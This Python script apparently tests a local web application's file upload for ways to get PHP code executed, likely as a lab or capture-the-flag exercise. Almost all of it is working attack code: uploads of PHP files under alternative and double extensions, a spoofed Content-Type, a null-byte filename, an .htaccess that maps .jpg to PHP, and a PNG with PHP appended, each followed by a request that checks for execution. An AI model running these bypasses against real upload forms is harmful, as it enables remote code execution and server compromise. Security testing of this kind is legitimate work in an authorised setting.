import requests
import struct
import zlib

base_url = "http://127.0.0.1:33021"

# Create a minimal valid PNG (1x1 pixel, single color)
def create_minimal_png():
    # PNG signature
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk (13 bytes of data)
    width = 1
    height = 1
    bit_depth = 8
    color_type = 2  # RGB
    compression = 0
    filter_method = 0
    interlace = 0
    
    ihdr_data = struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression, filter_method, interlace)
    ihdr_crc = zlib.crc32(b'IHDR' + ihdr_data)
    ihdr_chunk = struct.pack('>I', len(ihdr_data)) + b'IHDR' + ihdr_data + struct.pack('>I', ihdr_crc)
    
    # IDAT chunk (compressed image data)
    # For 1x1 RGB: filter byte + 3 bytes of pixel data
    raw_data = b'\x00\xff\x00\x00'  # filter 0, red pixel
    compressed_data = zlib.compress(raw_data)
    idat_crc = zlib.crc32(b'IDAT' + compressed_data)
    idat_chunk = struct.pack('>I', len(compressed_data)) + b'IDAT' + compressed_data + struct.pack('>I', idat_crc)
    
    # IEND chunk
    iend_crc = zlib.crc32(b'IEND')
    iend_chunk = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_crc)
    
    return signature + ihdr_chunk + idat_chunk + iend_chunk

# Test 1: Upload legitimate PNG
print("[*] TEST 1: Uploading legitimate PNG file")
png_content = create_minimal_png()
print(f"[+] PNG file size: {len(png_content)} bytes")

files = {'userfile': ('test.png', png_content, 'image/png')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

# Try to access uploaded PNG
png_access = requests.get(f"{base_url}/upload/test.png")
print(f"[+] Access test.png: {png_access.status_code}")
if png_access.status_code == 200:
    print(f"[+] PNG accessible, size: {len(png_access.content)} bytes")
print()

# Test 2: Upload PHP file
print("[*] TEST 2: Uploading PHP file (.php extension)")
php_content = b'<?php phpinfo(); ?>'
files = {'userfile': ('test.php', php_content, 'application/x-php')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

# Try to access PHP file
php_access = requests.get(f"{base_url}/upload/test.php")
print(f"[+] Access test.php: {php_access.status_code}")
if php_access.status_code == 200:
    print(f"[+] PHP file accessible!")
    print(f"[+] Response preview: {php_access.text[:200]}")
print()

# Test 3: Double extension bypass
print("[*] TEST 3: Double extension (.php.jpg)")
files = {'userfile': ('test.php.jpg', php_content, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

php_jpg_access = requests.get(f"{base_url}/upload/test.php.jpg")
print(f"[+] Access test.php.jpg: {php_jpg_access.status_code}")
if php_jpg_access.status_code == 200:
    print(f"[+] Response: {php_jpg_access.text[:200]}")
# Also try as .php
php_jpg_as_php = requests.get(f"{base_url}/upload/test.php")
print(f"[+] Access test.php (from double ext): {php_jpg_as_php.status_code}")
print()

# Test 4: Alternative extensions
alt_extensions = ['.phtml', '.php5', '.phar', '.php7', '.pht']
for ext in alt_extensions:
    print(f"[*] TEST: Extension {ext}")
    files = {'userfile': (f'test{ext}', php_content, 'application/x-php')}
    response = requests.post(f"{base_url}/index.php", files=files)
    print(f"[+] Status: {response.status_code}")
    print(f"[+] Response: {response.text[:300]}")
    
    # Try access
    access = requests.get(f"{base_url}/upload/test{ext}")
    print(f"[+] Access test{ext}: {access.status_code}")
    if access.status_code == 200 and 'phpinfo' in access.text.lower():
        print(f"[!] POTENTIAL RCE: {ext} executed!")
    print()

# Test 5: Content-Type spoofing
print("[*] TEST: Content-Type spoofing (PHP file as image/jpeg)")
files = {'userfile': ('test_spoof.php', php_content, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

spoof_access = requests.get(f"{base_url}/upload/test_spoof.php")
print(f"[+] Access test_spoof.php: {spoof_access.status_code}")
if spoof_access.status_code == 200:
    print(f"[+] Response: {spoof_access.text[:200]}")
print()

# Test 6: Null byte injection
print("[*] TEST: Null byte injection (test.php%00.jpg)")
null_byte_name = 'test.php\x00.jpg'
files = {'userfile': (null_byte_name, php_content, 'image/jpeg')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

# Try various access patterns
for name in ['test.php', 'test.php\x00.jpg', 'test.php%00.jpg']:
    try:
        access = requests.get(f"{base_url}/upload/{name}")
        print(f"[+] Access '{repr(name)}': {access.status_code}")
    except:
        pass
print()

# Test 7: Check upload directory listing
print("[*] TEST: Checking /upload/ directory listing")
dir_access = requests.get(f"{base_url}/upload/")
print(f"[+] Directory listing status: {dir_access.status_code}")
print(f"[+] Response:\n{dir_access.text[:500]}")
print()

# Test 8: Try .htaccess upload to enable PHP execution
print("[*] TEST: Uploading .htaccess")
htaccess_content = b'AddType application/x-httpd-php .jpg'
files = {'userfile': ('.htaccess', htaccess_content, 'text/plain')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

htaccess_access = requests.get(f"{base_url}/upload/.htaccess")
print(f"[+] Access .htaccess: {htaccess_access.status_code}")
print()

# Test 9: PHP inside valid image (polyglot attempt)
print("[*] TEST: PHP code appended to valid PNG")
png_with_php = create_minimal_png() + b'<?php phpinfo(); ?>'
files = {'userfile': ('polyglot.png', png_with_php, 'image/png')}
response = requests.post(f"{base_url}/index.php", files=files)
print(f"[+] Status: {response.status_code}")
print(f"[+] Response:\n{response.text}\n")

polyglot_access = requests.get(f"{base_url}/upload/polyglot.png")
print(f"[+] Access polyglot.png: {polyglot_access.status_code}")
if polyglot_access.status_code == 200:
    # Try as PHP
    polyglot_as_php = requests.get(f"{base_url}/upload/polyglot.php")
    print(f"[+] Access polyglot.php: {polyglot_as_php.status_code}")

print("\n" + "="*60)
print("SUMMARY OF FINDINGS")
print("="*60)

